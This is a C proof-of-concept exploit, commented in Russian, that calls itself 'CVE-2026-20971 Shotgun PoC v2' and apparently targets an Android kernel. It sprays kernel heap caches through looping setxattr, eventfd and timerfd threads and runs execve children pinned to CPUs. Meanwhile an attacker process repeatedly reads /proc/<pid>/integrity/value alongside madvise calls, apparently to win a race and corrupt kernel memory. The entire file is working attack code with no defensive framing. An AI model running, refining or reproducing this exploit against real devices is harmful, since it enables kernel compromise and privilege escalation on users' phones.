#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <string.h>
#include <sched.h>
#include <signal.h>
#include <sys/signalfd.h>
#include <sys/xattr.h>
#include <sys/timerfd.h>
#include <sys/eventfd.h>
#include <pthread.h>
#include <sys/resource.h>
#include <errno.h>
#include <time.h>

// Поток для спрея через setxattr
void* spray_xattr_thread(void* arg) {
    int size = *(int*)arg;
    char *value = malloc(size);
    if (!value) return NULL;
    memset(value, 'A', size);
    
    // Создаем временный файл в tmpfs для атрибутов
    char path[64];
    snprintf(path, sizeof(path), "/data/local/tmp/spray_file_%d", gettid());
    int fd = open(path, O_CREAT | O_RDWR, 0600);
    if (fd >= 0) close(fd);

    char name[64];
    long count = 0;
    while(1) {
        snprintf(name, sizeof(name), "user.spray_%ld", count);
        // setxattr аллоцирует память под simple_xattr (заголовок ~32 байта + size)
        setxattr(path, name, value, size, 0);
        count++;
    }
    return NULL;
}

// Спрей через eventfd (создает объекты в kmalloc-64/96)
void* spray_eventfd_thread(void* arg) {
    while(1) {
        int efd = eventfd(0, 0);
        if (efd < 0) usleep(1000);
    }
    return NULL;
}

// Спрей через timerfd (создает объекты в kmalloc-256)
void* spray_timerfd_thread(void* arg) {
    while(1) {
        int tfd = timerfd_create(CLOCK_MONOTONIC, 0);
        if (tfd < 0) usleep(1000);
    }
    return NULL;
}

int main() {
    setbuf(stdout, NULL);
    srand(time(NULL));

    // Поднимаем лимиты
    struct rlimit rlim = {200000, 200000};
    setrlimit(RLIMIT_NOFILE, &rlim);

    printf("[*] CVE-2026-20971 Shotgun PoC v2 (xattr + eventfd + timerfd)\n");

    // 1. Запускаем потоки-спреи setxattr с разными размерами
    // Чтобы покрыть kmalloc-64, 128, 256, 512, 1024
    int sizes[] = {32, 96, 224, 480, 992}; 
    for (int i = 0; i < 5; i++) {
        pthread_t tid;
        pthread_create(&tid, NULL, spray_xattr_thread, &sizes[i]);
        pthread_detach(tid);
    }

    // Добавляем eventfd и timerfd для покрытия других кэшей
    for (int i=0; i<2; i++) {
        pthread_t tid;
        pthread_create(&tid, NULL, spray_eventfd_thread, NULL);
        pthread_detach(tid);
        
        pthread_create(&tid, NULL, spray_timerfd_thread, NULL);
        pthread_detach(tid);
    }

    // 2. Запускаем 4 дочерних процесса для execve
    pid_t pids[4];
    for (int i=0; i<4; i++) {
        pids[i] = fork();
        if (pids[i] == 0) {
            cpu_set_t set;
            CPU_ZERO(&set);
            CPU_SET(1 + (i % 3), &set); 
            sched_setaffinity(0, sizeof(set), &set);
            
            char *argv[] = {"/system/bin/true", NULL};
            char *envp[] = {NULL};
            while (1) {
                execve("/system/bin/true", argv, envp);
                _exit(1);
            }
        }
    }

    printf("[*] Started 4 children and multiple spray threads.\n");

    // 3. Атакующий процесс
    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(0, &set); 
    sched_setaffinity(0, sizeof(set), &set);

    char *buf = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    char path[64];
    long iterations = 0;

    while (1) {
        int idx = rand() % 4;
        snprintf(path, sizeof(path), "/proc/%d/integrity/value", pids[idx]);

        madvise(buf, 4096, MADV_DONTNEED);

        int fd = open(path, O_RDONLY);
        if (fd >= 0) {
            read(fd, buf, 4096); 
            close(fd);
        }
        
        iterations++;
        if (iterations % 100000 == 0) {
            printf("[*] Iterations: %ld\n", iterations);
        }
    }
    return 0;
}